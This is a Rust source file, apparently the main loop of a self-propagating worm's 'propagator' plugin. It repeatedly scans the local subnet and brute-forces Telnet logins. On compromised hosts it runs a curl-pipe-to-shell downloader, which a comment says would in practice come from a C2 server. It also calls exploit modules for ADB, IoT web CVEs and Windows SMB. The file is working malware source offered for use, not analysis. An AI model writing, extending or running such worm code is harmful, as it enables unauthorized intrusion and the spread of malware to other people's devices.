mod modules;
use std::time::Duration;
use ::loader::loader;
use log::{info, error};

// In real scenario, this would be a downloader script hosted on an exploited server or C2
const WORM_PAYLOAD: &str = "curl -sL http://127.0.0.1:8080/setup.sh | sh"; 

#[tokio::main]
async fn main() {
    env_logger::init();
    info!("* [Propagator Plugin] Modular Engine Started.");
    
    // Initial delay
    tokio::time::sleep(Duration::from_secs(5)).await;

    loop {
        info!("* [Propagator] Scanning Local Subnet...");
        
        // Use loader::scanner (raw TCP) to just find ALIVE HOSTS first
        // But loader::scanner specifically checks port 23.
        // We need a generic "Ping" or port scan.
        // For now, let's reuse loader::scanner logic but modify it to be generic?
        // Or cleaner: Use loader's IP generation, but do our own Multi-Port check.
        // Actually, let's use scanner::scan_local_subnet() just to find Telnet targets for now,
        // and add custom scan for ADB (5555).
        
        let local_ip = match local_ip_address::local_ip() {
             Ok(ip) => ip,
             Err(_) => {
                 tokio::time::sleep(Duration::from_secs(10)).await;
                 continue;
             }
        };
        let ip_str = local_ip.to_string();
        let parts: Vec<&str> = ip_str.split('.').collect();
        if parts.len() >= 3 {
             let subnet = format!("{}.{}.{}.", parts[0], parts[1], parts[2]);
             
             // Scan Loop
             for i in 1..255 {
                let target_ip = format!("{}{}", subnet, i);
                let t_ip = target_ip.clone();
                
                tokio::spawn(async move {
                    // 1. Port 23 (Telnet) -> Bruteforce
                    if is_open(&t_ip, 23).await {
                         if let Some((u, p)) = modules::bruteforce::run_bruteforce(&t_ip, 23).await {
                             info!("+ [Propagator] Pwned Telnet: {}", t_ip);
                             // Payload Delivery
                             let _ = loader::infect_target(&format!("{}:23", t_ip), &u, &p, WORM_PAYLOAD).await;
                         }
                    }
                    
                    // 2. Port 5555 (ADB)
                    if is_open(&t_ip, 5555).await {
                         if modules::adb::run_adb_exploit(&t_ip).await {
                             info!("+ [Propagator] Pwned ADB: {}", t_ip);
                         }
                    }

                    // 3. Port 80/8080 (IoT CVEs)
                    if is_open(&t_ip, 80).await || is_open(&t_ip, 8080).await {
                        modules::cve_iot::run_iot_exploit(&t_ip).await;
                    }

                    // 4. Port 445 (SMB - Windows)
                    if is_open(&t_ip, 445).await {
                        modules::cve_win::run_win_exploit(&t_ip).await;
                    }
                });
             }
        }
        
        tokio::time::sleep(Duration::from_secs(60)).await;
    }
}

async fn is_open(ip: &str, port: u16) -> bool {
    use tokio::net::TcpStream;
    let addr = format!("{}:{}", ip, port);
    match tokio::time::timeout(Duration::from_millis(500), TcpStream::connect(addr)).await {
        Ok(Ok(_)) => true,
        _ => false,
    }
}

